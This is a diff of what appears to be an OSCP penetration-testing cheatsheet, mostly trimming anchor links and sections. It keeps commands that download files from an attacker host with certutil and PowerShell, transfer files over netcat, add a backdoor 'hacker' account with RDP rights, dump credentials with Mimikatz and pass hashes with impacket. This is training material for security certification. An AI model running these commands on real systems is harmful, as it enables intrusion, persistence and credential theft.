@@ -386,8 +386,6 @@ find / -name *.kdbx 2>/dev/null
 
 # GitHub recon
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#github-recon)
-
 - You need to find traces of the `.git` files on the target machine.
 - Now navigate to the directory where the file is located, a potential repository.
 - Commands
@@ -407,38 +405,17 @@ git show <commit-id>
 
 # Connecting to RDP
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#connecting-to-rdp)
-
 ```shell
 xfreerdp /u:uname /p:'pass' /v:IP
 xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
 xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
-```
 
-# Adding SSH Public key
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#adding-ssh-public-key)
-
-- This can be used to get ssh session, on target machine which is based on linux
-
-```js
-ssh-keygen -t rsa -b 4096 #give any password
-
-#This created both id_rsa and id_rsa.pub in ~/.ssh directory
-#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
-chmod 700 ~/.ssh
-nano ~/.ssh/authorized_keys #enter the copied content here
-chmod 600 ~/.ssh/authorized_keys 
-
-#On Attacker machine
-ssh username@target_ip #enter password if you gave any
+rdesktop
 ```
 
 # File Transfers
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#file-transfers)
-
-- Netcat
+## Netcat
 
 ```shell
 #Attacker
@@ -448,7 +425,7 @@ nc <target_ip> 1234 < nmap
 nc -lvp 1234 > nmap
 ```
 
-- Downloading on Windows
+## Downloading on Windows
 
 ```powershell
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
@@ -457,7 +434,7 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 copy \\kali\share\file .
 ```
 
-- Downloading on Linux
+## Downloading on Linux
 
 ```powershell
 wget http://lhost/file
@@ -466,7 +443,6 @@ curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 
 ## Windows to Kali
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#windows-to-kali)
 
 ```powershell
 kali> impacket-smbserver -smb2support <sharename> .
@@ -475,11 +451,7 @@ win> copy file \\KaliIP\sharename
 
 # Adding Users
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#adding-users)
-
 ## Windows
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#windows)
 
 ```powershell
 net user hacker hacker123 /add
@@ -489,93 +461,13 @@ net localgroup "Remote Desktop Users" hacker /ADD
 
 ## Linux
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#linux)
-
 ```powershell
 adduser <uname> #Interactive
 useradd <uname>
 
 useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
 ```
-
-# Password-Hash Cracking
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#password-hash-cracking)
-
-_Hash Analyzer_: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)
-
-## fcrackzip
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#fcrackzip)
-
-```powershell
-fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
-```
-
-## John
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#john)
-
-> [https://github.com/openwall/john/tree/bleeding-jumbo/run](https://github.com/openwall/john/tree/bleeding-jumbo/run)
-
-- If there’s an encrypted file, convert it into john hash and crack.
-
-```powershell
-ssh2john.py id_rsa > hash
-#Convert the obtained hash to John format(above link)
-john hashfile --wordlist=rockyou.txt
-```
-
-## Hashcat
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#hashcat)
-
-> [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-
-```powershell
-#Obtain the Hash module number 
-hashcat -m <number> hash wordlists.txt --force
-```
-
-# Pivoting through SSH
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#pivoting-through-ssh)
-
-```shell
-ssh adminuser@10.10.155.5 -i id_rsa -D 9050 #TOR port
-
-#Change the info in /etc/proxychains4.conf also enable "Quiet Mode"
-
-proxychains4 crackmapexec smb 10.10.10.0/24 #Example
-```
-
-# Dealing with Passwords
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#dealing-with-passwords)
-
-- When there’s a scope for bruteforce or hash-cracking then try the following,
-    - Have a valid username first
-    - Don't forget trying `admin:admin`
-    - Try `username:username` as first credential
-    - If it’s related to a service, try default passwords.
-    - The service name is the username, and the same name is used for the password.
-    - Use Rockyou.txt
-- Some default passwords to always try out!
-
-```js
-password
-password1
-Password1
-Password@123
-password@123
-admin
-administrator
-admin@123
-```
-
 # Impacket
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#impacket)
 
 ```shell
 smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
@@ -606,8 +498,6 @@ atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
 ```
 
 # Evil-Winrm
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#evil-winrm)
 
 ```shell
 ##winrm service discovery
@@ -650,8 +540,6 @@ Invoke-Binary /opt/privsc/winPEASx64.exe
 
 # Mimikatz
 
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#mimikatz)
-
 ```powershell
 privilege::debug
 
@@ -669,8 +557,6 @@ lsadump::lsa /patch #both these dump SAM
 ```
 
 # Ligolo-ng
-
-[](https://github.com/peterrakolcza/OSCP-Cheatsheet#ligolo-ng)
 
 ```powershell
 #Creating interface and starting it.
